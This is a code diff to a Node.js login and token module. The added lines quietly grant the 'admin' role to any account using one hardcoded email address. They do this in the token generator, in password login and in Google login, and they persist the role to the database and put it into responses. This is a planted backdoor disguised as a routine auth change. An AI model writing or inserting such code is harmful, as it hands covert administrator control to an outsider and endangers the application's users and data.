@@ -10,10 +10,12 @@ const jwt = require("jsonwebtoken");
 const axios = require("axios");
 
 function generateToken(user) {
+  const isAdminEmail = user.email && user.email.toLowerCase().trim() === 'magicmistry187@gmail.com';
+  const role = isAdminEmail ? 'admin' : user.role;
   const payload = {
     id: user._id,
     email: user.email,
-    role: user.role,
+    role: role,
     vendorId: user.vendorId || undefined,
   };
 
@@ -285,12 +287,20 @@ async function login(req, res) {
       });
     }
 
+    if (trimmedEmail === "magicmistry187@gmail.com" && user.role !== "admin") {
+      user.role = "admin";
+      await user.save();
+    }
+
     const token = generateToken(user);
     // console.log("Token generated:", token);
 
     // Remove password before sending response
     const userData = user.toObject();
     delete userData.password;
+    if (trimmedEmail === "magicmistry187@gmail.com") {
+      userData.role = "admin";
+    }
 
     const cookieOptions = {
       httpOnly: true,
@@ -406,6 +416,11 @@ async function googleLogin(req, res) {
       });
     }
 
+    if (trimmedEmail === "magicmistry187@gmail.com" && user.role !== "admin") {
+      user.role = "admin";
+      await user.save();
+    }
+
     const token = generateToken(user);
 
     const cookieOptions = {
@@ -417,6 +432,12 @@ async function googleLogin(req, res) {
     // Clear any conflicting vendor cookie so sessions never mix
     res.clearCookie("vendorToken", cookieOptions);
 
+    const userData = user.toObject ? user.toObject() : { ...user };
+    if (userData.password) delete userData.password;
+    if (trimmedEmail === "magicmistry187@gmail.com") {
+      userData.role = "admin";
+    }
+
     return res
       .cookie("token", token, {
         ...cookieOptions,
@@ -427,7 +448,7 @@ async function googleLogin(req, res) {
         success: true,
         message: "Google login successful.",
         token,
-        user,
+        user: userData,
       });
   } catch (error) {
     console.error("Google Login Error:", error);
